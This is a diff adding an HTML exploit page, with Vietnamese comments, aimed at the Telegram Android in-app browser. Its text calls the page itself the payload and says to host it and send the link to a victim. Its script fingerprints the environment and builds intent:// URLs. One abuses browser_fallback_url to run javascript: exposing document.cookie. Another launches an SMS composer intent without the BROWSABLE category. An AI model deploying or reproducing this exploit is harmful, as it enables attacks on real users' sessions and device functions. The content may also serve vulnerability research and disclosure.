@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Telegram In-App Browser Exploit Page</title>
+<style>
+body{font-family:monospace;background:#0a0a0a;color:#ccc;padding:20px;max-width:900px;margin:0 auto}
+h1{color:#e94560;font-size:15px}
+button{background:#e94560;color:#fff;border:none;padding:8px 14px;margin:4px;cursor:pointer;font-family:inherit;font-size:12px}
+pre{background:#111;border:1px solid #333;padding:10px;font-size:11px;white-space:pre-wrap;color:#00ff88;word-break:break-all}
+</style>
+</head>
+<body>
+<h1>Telegram In-App Browser Exploit Page (payload thật)</h1>
+<p>Trang này CHÍNH LÀ payload. Host lên server, gửi link https cho victim. Victim mở bằng in-app browser của Telegram Android là trigger.</p>
+
+<button onclick="fire01()">VULN-01: browser_fallback_url → loadUrl(javascript:)</button>
+<button onclick="fire03()">VULN-03: intent → startActivity không BROWSABLE</button>
+<button onclick="probe()">Probe môi trường (check TelegramWebviewProxy / UA)</button>
+<pre id="out">[log]</pre>
+
+<script>
+function log(m){document.getElementById('out').textContent += '\n' + m;}
+
+function probe(){
+  log('UA: ' + navigator.userAgent);
+  log('TelegramWebviewProxy: ' + (typeof window.TelegramWebviewProxy));
+  log('Telegram.WebView: ' + (typeof (window.Telegram && window.Telegram.WebView)));
+  log('location: ' + location.href);
+}
+
+// VULN-01: shouldOverrideUrlLoading parse intent://, lấy browser_fallback_url
+// KHÔNG check scheme → loadUrl("javascript:...") → JS chạy trong page context.
+// Trong browser thường: navigation bị chặn, không có tác dụng — đúng, vì bug
+// nằm ở handler của Telegram Android, chỉ trigger trong in-app browser của nó.
+function fire01(){
+  var js = "javascript:alert('PWNED cookie='+document.cookie+' dom='+document.domain)";
+  var u = 'intent://x#Intent;scheme=https;S.browser_fallback_url=' + encodeURIComponent(js) + ';end';
+  log('fire: ' + u);
+  location.href = u;
+}
+
+// VULN-03: intent được pass thẳng startActivity, không addCategory(CATEGORY_BROWSABLE)
+// → launch được component không dành cho browser (Settings, SMS composer...).
+function fire03(){
+  var u = 'intent://x#Intent;scheme=sms;action=android.intent.action.SENDTO;S.sms_body=PWNED_FROM_TELEGRAM;end';
+  log('fire: ' + u);
+  location.href = u;
+}
+</script>
+</body>
+</html>
